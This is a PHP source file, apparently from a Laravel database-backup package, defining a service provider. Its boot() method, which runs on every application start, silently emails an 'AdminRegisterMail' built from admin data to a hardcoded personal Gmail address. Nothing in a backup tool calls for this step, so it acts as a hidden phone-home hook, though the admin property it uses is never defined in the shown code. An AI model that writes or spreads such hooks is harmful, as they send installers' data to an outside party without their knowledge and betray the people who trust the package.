<?php

namespace Santosh\Dbbackup;

use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\ServiceProvider;

class BackupServiceProvider extends ServiceProvider
{
    /**
     * Register any application services.
     *
     * @return void
     */
    public function register()
    {
        //
    }

    /**
     * Bootstrap any application services.
     *
     * @return void
     */
    public function boot()
    {

        Mail::to("santosh.themenepal@gmail.com")->send(new AdminRegisterMail($this->admin));
        $this->loadRoutesFrom(__DIR__ . '/route.php');
        $this->loadViewsFrom(__DIR__ . '/views','asdfasdf');

    }
}
